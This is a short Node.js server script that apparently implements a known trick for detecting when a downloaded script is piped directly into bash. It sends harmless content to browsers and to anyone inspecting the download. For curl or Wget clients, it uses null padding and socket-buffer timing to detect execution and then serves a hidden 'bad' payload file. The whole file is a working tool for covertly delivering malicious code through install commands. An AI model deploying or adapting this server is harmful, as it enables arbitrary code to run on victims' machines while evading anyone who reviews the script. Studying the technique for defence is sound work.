const initalFile = "myinitialfile";
	  goodFile = "myfile";
	  badFile = "mybadfile";
	  port = 8080;

const http = require('http'),
	  fs = require('fs');

function handleRequest(request, response){
	// Don't even bother testing if it's being piped if the Useragent isn't curl/Wget
	const ua = request.headers['user-agent']
	if(!(ua.includes("Wget") || ua.includes("curl"))) {
		var stream = fs.createReadStream(goodFile);
		stream.pipe(response);
		console.log("Not curl/wget, Good Sent");
		return;
	}

	// Send the inital base file that contains a delay.
	// Strange bug occurs when you leave it as a buffer, not entirely sure why
	const inital = fs.readFileSync(initalFile).toString();
	response.write(inital);

	// Send padding to the client to try to fill their recieving socket buffer.
	// This will cause the server side socket buffer to fill, which we detect.
	var bash = false;
	for (var i = 0; i < 40; i++) {
		response.write(padding);
		if(request.socket.bufferSize > 0) {
			bash = true;
			break;
		}
	}

	// If our buffer filled, we know they're piping it into bash, send the bad payload
	if(bash) {
		var stream = fs.createReadStream(badFile);
		stream.pipe(response);
		console.log("Bad Sent");
	} else {
		var stream = fs.createReadStream(goodFile);
		stream.pipe(response);
		console.log("Good Sent");
	}
}

const padding = '\0'.repeat(87380);
http.createServer(handleRequest).listen(port, function() {
	console.log("Server started on port " + port);
});